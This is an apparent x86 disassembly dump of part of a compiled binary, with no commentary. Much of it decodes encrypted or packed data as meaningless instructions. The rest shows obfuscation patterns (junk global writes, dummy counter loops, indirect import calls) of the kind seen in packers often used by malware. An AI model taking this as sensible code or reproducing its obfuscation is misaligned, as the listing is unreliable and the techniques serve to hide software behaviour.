  40481b:	inc    esi
  40481c:	adc    ah,bh
  40481e:	out    dx,al
  40481f:	stos   DWORD PTR es:[edi],eax
  404820:	and    al,0x2d
  404822:	push   edi
  404823:	hlt    
  404824:	add    bl,BYTE PTR [edx-0x2e]
  404827:	mov    esp,0xdfafb6ef
  40482c:	dec    dl
  40482e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40482f:	mov    ebx,0x26fbd395
  404834:	sub    eax,0x718e7b65
  404839:	(bad)  
  40483a:	sub    ebp,DWORD PTR [eax]
  40483c:	mov    edi,0x935fed3c
  404841:	xor    al,0xb9
  404843:	mov    eax,0xf278aec1
  404848:	push   esp
  404849:	xchg   BYTE PTR [edi+ecx*2+0x65f2a933],ah
  404850:	cmp    eax,0xe54661c3
  404855:	push   ds
  404856:	fsub   st,st(1)
  404858:	or     eax,0xe4890a2c
  40485d:	or     al,0xda
  40485f:	xor    ah,BYTE PTR [ecx]
  404861:	cmp    eax,0x33fa4070
  404867:	cwde   
  404868:	inc    edx
  404869:	loop   0x404827
  40486b:	xchg   ecx,eax
  40486c:	xchg   ecx,eax
  40486d:	cli    
  40486e:	mov    eax,ds:0x495f76a9
  404873:	pop    ss
  404874:	outs   dx,DWORD PTR ds:[esi]
  404875:	pop    ds
  404876:	fdivr  st,st(2)
  404878:	dec    ecx
  404879:	loop   0x4048c8
  40487b:	cmp    BYTE PTR [edx],dl
  40487d:	xor    esi,0xa8b5d116
  404883:	icebp  
  404884:	aaa    
  404885:	test   BYTE PTR [eax+eiz*2],0xa7
  404889:	lods   al,BYTE PTR ds:[esi]
  40488a:	cdq    
  40488b:	repz cmp DWORD PTR [ebp+0x37],0x38
  404890:	loopne 0x4048dc
  404892:	in     eax,0xc5
  404894:	leave  
  404895:	jmp    0x8703:0x7c323311
  40489c:	fs sbb cl,bh
  40489f:	cmp    bl,BYTE PTR [ecx]
  4048a1:	push   ebp
  4048a2:	outs   dx,DWORD PTR ds:[esi]
  4048a3:	cmp    eax,0xdcb08f78
  4048a8:	pop    ecx
  4048a9:	cmp    esp,DWORD PTR [edx-0x3e]
  4048ac:	(bad)  
  4048ad:	cli    
  4048ae:	xor    ebx,DWORD PTR [edi-0x70]
  4048b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4048b2:	in     eax,0xc8
  4048b4:	popf   
  4048b5:	push   ebp
  4048b6:	je     0x40483b
  4048b8:	test   BYTE PTR [ecx+0x5],al
  4048bb:	jge    0x404931
  4048bd:	adc    al,0x7
  4048bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4048c0:	int    0x69
  4048c2:	ss iret 
  4048c4:	pop    ecx
  4048c5:	(bad)  
  4048c6:	(bad)  
  4048c8:	clc    
  4048c9:	push   eax
  4048ca:	mov    ?,WORD PTR [edx]
  4048cc:	pop    ds
  4048cd:	outs   dx,BYTE PTR ds:[esi]
  4048ce:	or     ebp,DWORD PTR [ebp-0x368ecd6c]
  4048d4:	clc    
  4048d5:	add    bh,BYTE PTR [ecx]
  4048d7:	not    eax
  4048d9:	paddsb mm5,QWORD PTR [eax+0x4dac4ebe]
  4048e0:	sahf   
  4048e1:	arpl   WORD PTR [eax+edi*4-0x2b],ax
  4048e5:	sti    
  4048e6:	cli    
  4048e7:	sahf   
  4048e8:	inc    ebx
  4048e9:	jae    0x404914
  4048eb:	in     eax,dx
  4048ec:	jle    0x404917
  4048ee:	dec    eax
  4048ef:	mov    WORD PTR [eax+eiz*8-0x77e924dd],0xfb73
  4048f9:	jmp    0x871363a8
  4048fe:	mov    edx,0x273ef9dd
  404903:	or     eax,0xf08e883d
  404908:	test   BYTE PTR [eax+0x1b],bl
  40490b:	mov    al,0xfb
  40490d:	sbb    BYTE PTR [eax],0xfd
  404910:	push   cs
  404911:	ins    BYTE PTR es:[edi],dx
  404912:	repz jbe 0x4048ce
  404915:	inc    eax
  404916:	test   BYTE PTR [ecx+esi*4],dl
  404919:	neg    DWORD PTR [ebx+0x52]
  40491c:	mov    cl,BYTE PTR [ecx-0x5f]
  40491f:	jge    0x40492a
  404921:	xchg   edx,eax
  404922:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404923:	outs   dx,BYTE PTR ds:[esi]
  404924:	jl     0x404998
  404926:	arpl   WORD PTR [ebp+0x32bacbc5],di
  40492c:	enter  0x2c29,0xd6
  404930:	mov    ebx,0xce1268f8
  404935:	sub    ebp,ebx
  404937:	and    ebp,DWORD PTR [ecx+0x1a]
  40493a:	add    BYTE PTR [edx],dh
  40493c:	push   ebp
  40493d:	enter  0xb5fd,0x6a
  404941:	inc    edi
  404942:	adc    edi,DWORD PTR [edi+0x23]
  404945:	test   eax,0x1803ebfd
  40494a:	add    esp,esi
  40494c:	jl     0x40491c
  40494e:	repnz mov ds:0xab375c2e,eax
  404954:	push   ebx
  404955:	iret   
  404956:	stos   DWORD PTR es:[edi],eax
  404957:	push   0xffffff83
  404959:	xchg   dl,dl
  40495b:	ss dec ebx
  40495d:	js     0x4049b3
  40495f:	ret    0x3f9d
  404962:	fcom   QWORD PTR [eax]
  404964:	and    ch,BYTE PTR [edx]
  404966:	mov    al,ds:0x1e18ef2f
  40496b:	stos   DWORD PTR es:[edi],eax
  40496c:	push   ds
  40496d:	shr    BYTE PTR [ebx+0x1226119e],1
  404973:	mov    ecx,0xe2ea5a32
  404978:	enter  0x7904,0x72
  40497c:	cmc    
  40497d:	xor    bl,bl
  40497f:	sti    
  404980:	jb     0x4049dc
  404982:	push   edi
  404983:	ss in  al,0xb
  404986:	out    dx,al
  404987:	or     BYTE PTR [ecx],dl
  404989:	sub    al,0x1a
  40498b:	(bad)  
  40498c:	lock sbb dl,BYTE PTR [edi+0x73]
  404990:	mov    al,0xa3
  404992:	jmp    0x4049b4
  404994:	sub    ah,BYTE PTR [edi]
  404996:	adc    BYTE PTR ds:0x2cbe58c2,0x32
  40499d:	mov    DWORD PTR [edx],esp
  40499f:	adc    DWORD PTR [esi+ebx*8+0x14],0x943d2ed3
  4049a7:	stos   BYTE PTR es:[edi],al
  4049a8:	ret    
  4049a9:	dec    ebp
  4049aa:	dec    esi
  4049ab:	add    DWORD PTR [edi+0x6d],esi
  4049ae:	mov    ebx,0xd3400f1
  4049b3:	mov    edx,edx
  4049b5:	push   ebx
  4049b6:	js     0x40497f
  4049b8:	js     0x404a16
  4049ba:	adc    al,bh
  4049bc:	lds    ebx,FWORD PTR [edx]
  4049be:	dec    edx
  4049bf:	jge    0x4049f6
  4049c1:	cmp    BYTE PTR [edi-0x71],dl
  4049c4:	loope  0x404a1a
  4049c6:	(bad)  
  4049c7:	repnz sahf 
  4049c9:	and    ebp,DWORD PTR [eax+0x6a19ef55]
  4049cf:	cmp    DWORD PTR [eax-0x41],ebp
  4049d2:	cld    
  4049d3:	pop    eax
  4049d4:	pop    ebx
  4049d5:	xchg   edx,eax
  4049d6:	adc    al,0x37
  4049d8:	jmp    0x8d46885c
  4049dd:	xchg   esi,eax
  4049de:	cmp    BYTE PTR [ebx],al
  4049e0:	repz or DWORD PTR [ebx-0x7bcae5ac],eax
  4049e7:	je     0x4049f3
  4049e9:	mov    ebx,0x6e737490
  4049ee:	push   ebp
  4049ef:	ins    DWORD PTR es:[edi],dx
  4049f0:	pop    eax
  4049f1:	sub    ch,BYTE PTR [ebx]
  4049f3:	adc    ecx,edx
  4049f5:	sti    
  4049f6:	lahf   
  4049f7:	mov    eax,DWORD PTR [bp+si]
  4049fa:	jle    0x404a43
  4049fc:	dec    ecx
  4049fd:	xor    BYTE PTR [edi+0x6d3608e2],ah
  404a03:	mov    ch,0x25
  404a05:	sar    DWORD PTR [ebx+esi*8-0x703bffd6],1
  404a0c:	mov    eax,ds:0xbc37f23
  404a11:	add    cl,BYTE PTR [esi-0x12]
  404a14:	xchg   cl,dh
  404a16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a17:	xor    DWORD PTR [ebx],edi
  404a19:	shr    BYTE PTR [eax],cl
  404a1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a1c:	push   esp
  404a1d:	cli    
  404a1e:	xchg   edx,eax
  404a1f:	in     al,0x9e
  404a21:	aas    
  404a22:	pop    esp
  404a23:	xchg   esi,eax
  404a24:	fcmovnbe st,st(4)
  404a27:	xor    bl,bh
  404a29:	jb     0x4049bc
  404a2b:	and    eax,0x920ada49
  404a30:	sub    ebx,DWORD PTR [ecx+0x4]
  404a33:	hlt    
  404a34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a35:	xor    dl,BYTE PTR [ebp*2+0x3e20bda3]
  404a3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404a3d:	inc    ecx
  404a3e:	sub    bl,BYTE PTR [edx+0x44ef247]
  404a44:	jmp    0x404a0c
  404a46:	xor    eax,0xa6cee6a3
  404a4b:	mov    eax,0x50363d53
  404a50:	and    DWORD PTR [edx],esp
  404a52:	shr    DWORD PTR [esi],cl
  404a54:	xor    eax,0x9e1923f9
  404a59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404a5a:	cmc    
  404a5b:	jge    0x404abc
  404a5d:	std    
  404a5e:	sbb    eax,0x266cb86c
  404a63:	and    eax,0x507244a5
  404a68:	into   
  404a69:	bound  ecx,QWORD PTR [edx+ecx*2+0x5f424dde]
  404a70:	pop    esi
  404a71:	pop    ebx
  404a72:	leave  
  404a73:	ret    
  404a74:	push   ebp
  404a75:	mov    ebp,esp
  404a77:	sub    esp,0x2c
  404a7a:	leave  
  404a7b:	ret    0x10
  404a7e:	push   ebp
  404a7f:	mov    ebp,esp
  404a81:	sub    esp,0x44
  404a84:	adc    DWORD PTR ds:0x43373f,edi
  404a8a:	push   edi
  404a8b:	mov    eax,DWORD PTR [ebp+0xc]
  404a8e:	mov    edx,DWORD PTR ds:0x4336b7
  404a94:	and    DWORD PTR ds:0x433703,edx
  404a9a:	mov    DWORD PTR [ebp-0x10],eax
  404a9d:	adc    DWORD PTR ds:0x43362b,0x2679
  404aa7:	mov    eax,DWORD PTR [ebp+0x8]
  404aaa:	xor    ecx,DWORD PTR ds:0x43366b
  404ab0:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  404ab7:	mov    DWORD PTR ds:0x43372b,0x7030
  404ac1:	mov    DWORD PTR [ebp-0x20],0xf89c8532
  404ac8:	and    DWORD PTR ds:0x4336c3,0x0
  404ad2:	mov    edi,DWORD PTR ds:0x4336c3
  404ad8:	inc    edi
  404ad9:	mov    DWORD PTR ds:0x4336c3,edi
  404adf:	cmp    DWORD PTR ds:0x4336c3,0x6
  404ae6:	jne    0x404af5
  404aec:	push   DWORD PTR [ebp-0x18]
  404aef:	call   DWORD PTR ds:0x412358
  404af5:	cmp    DWORD PTR ds:0x4336c3,0x5
  404afc:	jne    0x404b0f
  404b02:	mov    edi,DWORD PTR ds:0x4336c3
  404b08:	inc    edi
  404b09:	mov    DWORD PTR ds:0x4336c3,edi
  404b0f:	cmp    DWORD PTR ds:0x4336c3,0x14
  404b16:	jb     0x404ad2
  404b1c:	jmp    0x404e76
  404b21:	push   ecx
  404b22:	mov    esi,0xf1913591
  404b27:	jno    0x404b83
  404b29:	ins    DWORD PTR es:[edi],dx
  404b2a:	inc    ebp
  404b2b:	fild   WORD PTR [ecx-0x61c1eee4]
  404b31:	xor    ebp,DWORD PTR ds:0x7d337e7e
  404b37:	jle    0x404bb7
  404b39:	pop    eax
  404b3a:	es int 0x72
  404b3d:	push   ds
  404b3e:	les    esp,FWORD PTR [eax-0x29a05af9]
  404b44:	sub    ebx,ecx
  404b46:	sar    BYTE PTR [edi],cl
  404b48:	push   esp
  404b49:	std    
  404b4a:	sub    BYTE PTR [ecx],0xb7
  404b4d:	pop    edi
  404b4e:	mov    ebx,0x9f62d111
  404b53:	jbe    0x404bb6
  404b55:	push   eax
  404b56:	es dec ebp
  404b58:	rcl    bh,0xbc
  404b5b:	jns    0x404b5f
  404b5d:	push   cs
  404b5e:	inc    esp
  404b5f:	mov    ecx,ebp
  404b61:	pop    edx
  404b62:	jg     0x404b79
  404b64:	push   edi
  404b65:	in     al,0x34
  404b67:	nop
  404b68:	pop    eax
  404b69:	mov    ebx,0xb88458d3
  404b6e:	jmp    0x404bad
  404b70:	adc    al,0xcb
  404b72:	imul   ebp,ebx,0x32
  404b75:	repnz inc ebx
  404b77:	xchg   DWORD PTR [edi+0x57f63f4b],esi
  404b7d:	pop    esp
  404b7e:	xor    BYTE PTR [esi+0xe0bcf13],cl
  404b84:	push   ecx
  404b86:	fbstp  TBYTE PTR [ebx+edi*2+0x38]
  404b8a:	lea    ebp,es:[edx]
  404b8d:	fdiv   DWORD PTR [esi+edi*4-0x6d4a7c6c]
  404b94:	retf   
  404b95:	sar    esi,0xe2
  404b98:	adc    eax,0xfd0a1b31
  404b9d:	pop    edi
  404b9e:	mov    ebx,0xdca9dbf8
  404ba3:	xor    al,BYTE PTR [ecx]
  404ba5:	test   BYTE PTR [edx],ch
  404ba7:	cs push ss
  404ba9:	xor    BYTE PTR [edx],ah
  404bab:	or     al,0x55
  404bad:	(bad)  
  404bae:	mov    esi,0x4abe24bf
  404bb3:	push   ecx
  404bb4:	mov    dl,0x6c
  404bb6:	mov    esp,0x473394e7
  404bbb:	adc    eax,0x1703f6d7
  404bc0:	fs retf 
  404bc2:	ror    BYTE PTR [ecx+0x72],0xb7
  404bc6:	mov    ss,WORD PTR fs:[edx-0x29]
  404bca:	add    BYTE PTR [ebx-0x3879a2bd],ah
  404bd0:	test   BYTE PTR [ecx-0x3c],ch
  404bd3:	pop    ds
  404bd4:	dec    esp
  404bd5:	repnz jmp 0x9940:0xeef0372b
  404bdd:	test   al,0x6
  404bdf:	jne    0x404b98
  404be1:	loop   0x404b72
  404be3:	in     al,dx
  404be4:	cmp    BYTE PTR ds:0x731dec5d,dl
  404bea:	(bad)  
  404beb:	rol    DWORD PTR [ecx],cl
  404bed:	in     al,0x2b
  404bef:	or     DWORD PTR [esi+ebp*4+0x7265221b],edi
  404bf6:	daa    
  404bf7:	shl    BYTE PTR [ebp-0x194bb06e],1
  404bfd:	mov    ebp,0x1b3a27f
  404c02:	jmp    0x8bc:0xec78640b
  404c09:	inc    ebx
  404c0a:	mov    ecx,0x2b95e397
  404c0f:	pushf  
  404c10:	clc    
  404c11:	ret    0x80b5
  404c14:	cmp    bl,bh
  404c16:	loope  0x404c3d
  404c18:	popf   
  404c19:	ins    BYTE PTR es:[edi],dx
  404c1a:	inc    ecx
  404c1b:	and    bl,BYTE PTR [esi-0x8c33446]
  404c21:	or     DWORD PTR [eax],esi
  404c23:	mov    dh,0xac
  404c25:	push   eax
  404c26:	sbb    esi,edx
  404c28:	dec    eax
  404c29:	push   edi
  404c2a:	cwde   
  404c2b:	mov    ds:0xcf61f112,al
  404c30:	push   ss
  404c31:	lea    ebx,[ebx]
  404c33:	pop    edx
  404c34:	sub    BYTE PTR [edx+0x23],bl
  404c37:	cs adc al,0xf7
  404c3a:	bound  eax,QWORD PTR [edi+0x6f]
  404c3d:	xor    eax,0x7404069
  404c42:	mov    esp,0x8354c1ee
  404c47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c48:	repnz (bad) 
  404c4a:	pusha  
  404c4b:	jo     0x404bdc
  404c4d:	xlat   BYTE PTR ds:[ebx]
  404c4e:	imul   esi,DWORD PTR [ebx-0x38],0x2e
  404c52:	call   0x4c12:0xaf63667b
  404c59:	dec    esp
  404c5a:	cli    
  404c5b:	adc    esi,DWORD PTR [ebx-0x6a]
  404c5e:	adc    DWORD PTR [edx],esi
  404c60:	out    0x69,eax
  404c62:	in     al,0xc5
  404c64:	mov    al,0x85
  404c66:	mov    DWORD PTR [ebp+0x2bee5859],eax
  404c6c:	push   cs
  404c6d:	or     dh,dl
  404c6f:	(bad)  
  404c70:	mov    al,ds:0x247deee8
  404c75:	jns    0x404ccf
  404c77:	and    ecx,DWORD PTR [ecx-0x45ab375f]
  404c7d:	dec    esp
  404c7e:	or     ebx,esp
  404c80:	(bad)  
  404c81:	adc    eax,DWORD PTR [ecx-0x52]
  404c84:	daa    
  404c85:	cmp    BYTE PTR [ecx+0x0],0xac
  404c89:	add    al,0x0
  404c8b:	sub    eax,0xde470ccd
  404c90:	xor    eax,0x5dae2291
  404c95:	mov    BYTE PTR [ebp-0x2a],ch
  404c98:	jp     0x404c55
  404c9a:	adc    edx,DWORD PTR [ecx-0x46e0930e]
  404ca0:	sar    BYTE PTR [ebp+0x2d8c98a0],1
  404ca6:	and    DWORD PTR [ebp+0x4e],esp
  404ca9:	out    dx,eax
  404caa:	cmp    edi,DWORD PTR [edx]
  404cac:	and    DWORD PTR [edi-0x7c],0xffffffee
  404cb0:	ret    0x353c
  404cb3:	jae    0x404d30
  404cb5:	pushf  
  404cb6:	nop
  404cb7:	hlt    
  404cb8:	mov    dh,0x7f
  404cbb:	push   0xfffffff9
  404cbd:	jae    0x404d28
  404cbf:	ja     0x404c91
  404cc1:	or     ecx,DWORD PTR [esi]
  404cc3:	(bad)  
  404cc4:	cld    
  404cc5:	pop    ss
  404cc6:	stos   BYTE PTR es:[edi],al
  404cc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404cc8:	(bad)  
  404cc9:	push   ebx
  404cca:	addr16 jp 0x404cd9
  404ccd:	jg     0x404c59
  404ccf:	fbld   TBYTE PTR [esi-0xaf67970]
  404cd5:	push   ss
  404cd6:	jbe    0x404c72
  404cd8:	fld    DWORD PTR [esi-0x6d476ebb]
  404cde:	dec    ecx
  404cdf:	dec    ecx
  404ce1:	mov    ebp,0xbf96711a
  404ce6:	mov    ah,0x6c
  404ce8:	js     0x404cb6
  404cea:	pusha  
  404ceb:	or     eax,0xd59624bf
  404cf0:	repnz or eax,0x9c496c90
  404cf6:	shl    DWORD PTR [edx+edx*8-0x365f5d68],0x6b
  404cfe:	cmp    ebx,DWORD PTR [ecx+ebx*1]
  404d01:	fist   DWORD PTR [eax]
  404d03:	loop   0x404d4a
  404d05:	dec    edx
  404d06:	xchg   ebx,eax
  404d07:	and    ebx,eax
  404d09:	push   esi
  404d0a:	cmp    al,0x1f
  404d0c:	loop   0x404ca6
  404d0e:	fisttp QWORD PTR [edi+0x75]
  404d11:	js     0x404ca0
  404d13:	push   eax
  404d14:	test   al,0x14
  404d16:	xor    BYTE PTR [ebp-0x6556ccf1],0xef
  404d1d:	sbb    DWORD PTR [ebx+0x5af284f6],ecx
  404d23:	add    al,BYTE PTR [ecx+0x78563790]
  404d29:	out    0x7a,eax
  404d2b:	jg     0x404d07
  404d2d:	popf   
  404d2e:	fmul   st,st(1)
  404d30:	fcomi  st,st(0)
  404d32:	sub    al,0x30
  404d34:	leave  
  404d35:	pusha  
  404d36:	loope  0x404d43
  404d38:	adc    ecx,esi
  404d3a:	inc    edi
  404d3b:	jle    0x404d4d
  404d3d:	das    
  404d3e:	sbb    edx,DWORD PTR [ecx-0x67ab8271]
  404d44:	inc    esi
  404d45:	imul   esp,edi,0x4b
  404d48:	mov    edi,0xa8057592
  404d4d:	mov    ebx,0xcddd14e6
  404d52:	or     eax,DWORD PTR [esi-0xc8079c8]
  404d58:	push   ecx
  404d59:	iret   
  404d5a:	shl    DWORD PTR ds:0xec29ac3e,cl
  404d60:	sub    eax,0xd17e620d
  404d65:	jo     0x404d1c
  404d67:	sub    DWORD PTR [ebp+0x459ba064],eax
  404d6d:	or     eax,0x75d52fba
  404d72:	in     al,0xde
  404d74:	leave  
  404d75:	(bad)  
  404d76:	mov    ah,0x94
  404d78:	aaa    
  404d79:	inc    eax
  404d7a:	dec    ebx
  404d7b:	cs mov ebp,0x1db440a0
  404d81:	pop    edx
  404d82:	cmc    
  404d83:	and    DWORD PTR [esi],0x9
  404d86:	xor    DWORD PTR [ebp+0x4da1e372],ebx
  404d8c:	fucom  st(4)
  404d8e:	sbb    BYTE PTR [eax+0x28],bl
  404d91:	test   cl,al
  404d93:	pop    esi
  404d94:	or     al,0xf
  404d96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d97:	xchg   ecx,eax
  404d98:	dec    DWORD PTR [edi]
  404d9a:	adc    edi,DWORD PTR [edi+0x6a6ef1e0]
  404da0:	mov    ds:0x7b8a3df9,al
  404da5:	vpmacsdd ymm5,ymm4,YMMWORD PTR [esi-0xfe77134],ymm4
  404daf:	xlat   BYTE PTR ds:[ebx]
  404db0:	sub    bh,BYTE PTR [edi]
  404db2:	js     0x404d3c
  404db4:	and    al,0xd3
  404db6:	mov    eax,ds:0x498d98bd
  404dbb:	cmc    
  404dbc:	xchg   ecx,eax
  404dbd:	cmc    
  404dbe:	int3   
  404dbf:	retf   
  404dc0:	test   eax,0x15806e7d
  404dc5:	push   0xadefaa44
  404dca:	pop    ecx
  404dcb:	adc    eax,0x2898c41a
  404dd0:	lds    esp,FWORD PTR [esi+ebx*1+0x71bbfd49]
  404dd7:	pop    esp
  404dd8:	adc    ecx,DWORD PTR [ecx]
  404dda:	gs push es
  404ddc:	xchg   esp,eax
  404ddd:	mov    esi,0xb264d85b
  404de2:	and    al,0xec
  404de4:	repz repz sti 
  404de7:	sub    BYTE PTR [ecx-0x31a196ec],0x60
  404dee:	nop
  404def:	mov    al,es:0x8f48c3d4
  404df5:	jge    0x404d7d
  404df7:	ja     0x404e5f
  404df9:	dec    esp
  404dfa:	mov    ebp,ebp
  404dfc:	inc    eax
  404dfd:	stos   BYTE PTR es:[edi],al
  404dfe:	lahf   
  404dff:	scas   al,BYTE PTR es:[edi]
  404e00:	repz cld 
  404e02:	leave  
  404e03:	cmp    edi,ebp
  404e05:	sbb    al,0x51
  404e07:	dec    esp
  404e08:	popf   
  404e09:	xor    BYTE PTR [esi-0x5c4fbc9b],bh
  404e0f:	xor    bl,BYTE PTR [ecx]
  404e11:	dec    ecx
  404e12:	sbb    edx,DWORD PTR [eax+0x732b38bf]
  404e18:	mov    ds:0x510c9e1,eax
  404e1d:	jns    0x404e6c
  404e1f:	clc    
  404e20:	xchg   ebx,eax
  404e21:	xor    al,0x13
  404e23:	(bad)  
  404e25:	xor    esp,DWORD PTR [edx]
  404e27:	iret   
  404e28:	clc    
  404e29:	bound  edi,QWORD PTR [edx]
  404e2b:	mov    edx,0x8c489107
  404e30:	dec    esi
  404e31:	cld    
  404e32:	(bad)  [eax-0x1971ad53]
  404e38:	out    0x6c,al
  404e3a:	adc    DWORD PTR [ecx],esp
  404e3c:	repz iret 
  404e3e:	mov    dh,0x21
  404e40:	loope  0x404e22
  404e42:	mov    ah,0x21
  404e44:	jle    0x404dc6
  404e46:	add    esi,0x70
  404e49:	pop    edi
  404e4a:	test   eax,0xb4ba7269
  404e4f:	xor    BYTE PTR [ebx+0x5674a203],0xb7
  404e56:	gs push edx
  404e58:	jne    0x404e61
  404e5a:	pop    ss
  404e5b:	pop    ds
  404e5c:	ret    
  404e5d:	cmp    bh,bh
  404e5f:	sub    DWORD PTR [ebx-0x79c9e2fc],edi
  404e65:	and    BYTE PTR [ebx],dh
  404e67:	aad    0x18
  404e69:	inc    edx
  404e6a:	push   ebp
  404e6b:	(bad)  
  404e6c:	or     BYTE PTR [ecx-0x66],ah
  404e6f:	mov    DWORD PTR [ecx+0x4b],edx
  404e72:	pop    es
  404e73:	xchg   esi,eax
  404e74:	out    0xd1,al
  404e76:	mov    edx,DWORD PTR [ebp+0x8]
  404e79:	adc    ecx,0x7359
  404e7f:	mov    DWORD PTR [ebp-0x40],eax
  404e82:	mov    eax,0x7510854
  404e87:	xor    edx,eax
  404e89:	adc    DWORD PTR ds:0x43361b,0x3221
  404e93:	mov    ecx,0x32729b
  404e98:	mov    edi,DWORD PTR ds:0x4336e7
  404e9e:	adc    DWORD PTR ds:0x43367f,edi
  404ea4:	add    edx,ecx
  404ea6:	neg    edi
  404ea8:	mov    DWORD PTR [ebp-0x8],edx
  404eab:	mov    DWORD PTR ds:0x4336eb,0x10
  404eb5:	cmp    DWORD PTR ds:0x4336eb,0x0
  404ebc:	je     0x404f14
  404ec2:	cmp    DWORD PTR ds:0x4336eb,0x9
  404ec9:	jne    0x404ee2
  404ecf:	push   0x6f04
  404ed4:	push   0x5d47
  404ed9:	push   DWORD PTR [ebp-0x1c]
  404edc:	call   DWORD PTR ds:0x41235c
  404ee2:	cmp    DWORD PTR ds:0x4336eb,0xa
  404ee9:	jne    0x404efc
  404eef:	mov    edi,DWORD PTR ds:0x4336eb
  404ef5:	dec    edi
  404ef6:	mov    DWORD PTR ds:0x4336eb,edi
  404efc:	mov    edi,DWORD PTR ds:0x4336eb
  404f02:	dec    edi
  404f03:	mov    DWORD PTR ds:0x4336eb,edi
  404f09:	jmp    0x404eb5
  404f0e:	and    DWORD PTR ds:0x43373f,ecx
  404f14:	mov    edx,DWORD PTR [ebp+0x8]
  404f17:	sbb    edi,DWORD PTR ds:0x4336eb
  404f1d:	xor    edx,eax
  404f1f:	sbb    edi,DWORD PTR ds:0x4336bf
  404f25:	add    edx,ecx
  404f27:	and    DWORD PTR ds:0x43373b,0x0
  404f31:	xor    edi,edi
  404f33:	add    edi,DWORD PTR ds:0x43373b
  404f39:	inc    edi
  404f3a:	mov    DWORD PTR ds:0x43373b,edi
  404f40:	cmp    DWORD PTR ds:0x43373b,0xc
  404f47:	jne    0x404f58
  404f4d:	push   0x3fd8
  404f52:	call   DWORD PTR ds:0x412000
  404f58:	cmp    DWORD PTR ds:0x43373b,0xb
  404f5f:	jne    0x404f72
  404f65:	mov    edi,DWORD PTR ds:0x43373b
  404f6b:	inc    edi
  404f6c:	mov    DWORD PTR ds:0x43373b,edi
  404f72:	cmp    DWORD PTR ds:0x43373b,0x17
  404f79:	jb     0x404f31
  404f7f:	mov    DWORD PTR [ebp+0xc],edx
  404f82:	mov    DWORD PTR ds:0x433637,0x5f27
  404f8c:	mov    DWORD PTR [ebp-0x4],0xf89c85d1
  404f93:	xor    DWORD PTR ds:0x433667,edi
  404f99:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  404fa0:	mov    DWORD PTR [ebp-0x2c],0xf89c853c
  404fa7:	sbb    DWORD PTR ds:0x4336ef,edi
  404fad:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  404fb4:	adc    DWORD PTR ds:0x43360f,ecx
  404fba:	mov    DWORD PTR [ebp-0x34],0xf89c853e
  404fc1:	movzx  edi,WORD PTR ds:0x433667
  404fc8:	and    DWORD PTR ds:0x433613,edi
  404fce:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  404fd5:	dec    edx
  404fd6:	mov    DWORD PTR [ebp-0x3c],0xf89c8538
  404fdd:	mov    edx,DWORD PTR [ebp+0x8]
  404fe0:	add    DWORD PTR ds:0x4336e7,ebx
  404fe6:	xor    edx,eax
  404fe8:	add    edi,0x469e
  404fee:	mov    edi,DWORD PTR [ebp-0x10]
  404ff1:	add    edx,ecx
  404ff3:	cmp    edi,edx
  404ff5:	mov    DWORD PTR ds:0x43372f,0x53a
  404fff:	je     0x40685f
  405005:	mov    DWORD PTR ds:0x433737,0x2c13
  40500f:	push   ebx
  405010:	mov    DWORD PTR ds:0x4336ef,0x2429
  40501a:	jmp    0x40683a
  40501f:	mov    edx,DWORD PTR [ebp-0x8]
  405022:	and    DWORD PTR ds:0x433627,0x0
  40502c:	mov    edi,DWORD PTR ds:0x433627
  405032:	inc    edi
  405033:	mov    DWORD PTR ds:0x433627,edi
  405039:	cmp    DWORD PTR ds:0x433627,0x6
  405040:	jne    0x40505d
  405046:	push   DWORD PTR [ebp-0x14]
  405049:	push   DWORD PTR [ebp-0x10]
  40504c:	push   DWORD PTR [ebp-0xc]
  40504f:	push   DWORD PTR [ebp-0x18]
  405052:	push   0x82f7
  405057:	call   DWORD PTR ds:0x41236c
  40505d:	cmp    DWORD PTR ds:0x433627,0x5
  405064:	jne    0x405079
  40506a:	xor    edi,edi
  40506c:	xor    edi,DWORD PTR ds:0x433627
  405072:	inc    edi
  405073:	mov    DWORD PTR ds:0x433627,edi
  405079:	cmp    DWORD PTR ds:0x433627,0x17
  405080:	jb     0x40502c
  405086:	xor    edi,edi
  405088:	add    edi,DWORD PTR ds:0x4336ff
  40508e:	add    DWORD PTR ds:0x4336bb,edi
  405094:	mov    edi,DWORD PTR [ebp-0x10]
  405097:	sub    edi,edx
  405099:	mov    edx,DWORD PTR [ebp-0x4]
  40509c:	xor    edx,eax
  40509e:	add    edx,ecx
  4050a0:	mov    DWORD PTR ds:0x4336eb,0x78fa
  4050aa:	cmp    edi,edx
  4050ac:	mov    DWORD PTR ds:0x43373b,0x49ec
  4050b6:	jb     0x40685e
  4050bc:	mov    edx,DWORD PTR [ebp-0x28]
  4050bf:	mov    edi,DWORD PTR [ebp-0x4]
  4050c2:	xor    edx,eax
  4050c4:	inc    DWORD PTR ds:0x43373b
  4050ca:	xor    edi,eax
  4050cc:	not    DWORD PTR ds:0x4336fb
  4050d2:	add    edi,ecx
  4050d4:	add    edx,ecx
  4050d6:	adc    ebx,0x69d8
  4050dc:	imul   edx,edi
  4050df:	mov    edi,DWORD PTR [ebp-0x8]
  4050e2:	mov    ebx,DWORD PTR [ebp-0x10]
  4050e5:	sbb    DWORD PTR ds:0x433627,0x4336b7
  4050ef:	sub    ebx,edi
  4050f1:	mov    DWORD PTR ds:0x43361f,0x4726
  4050fb:	cmp    ebx,edx
  4050fd:	mov    DWORD PTR ds:0x4336eb,0x2e42
  405107:	ja     0x4054d4
  40510d:	and    DWORD PTR ds:0x4336ff,0x0
  405117:	jmp    0x40512b
  40511c:	xor    edx,edx
  40511e:	add    edx,DWORD PTR ds:0x4336ff
  405124:	inc    edx
  405125:	mov    DWORD PTR ds:0x4336ff,edx
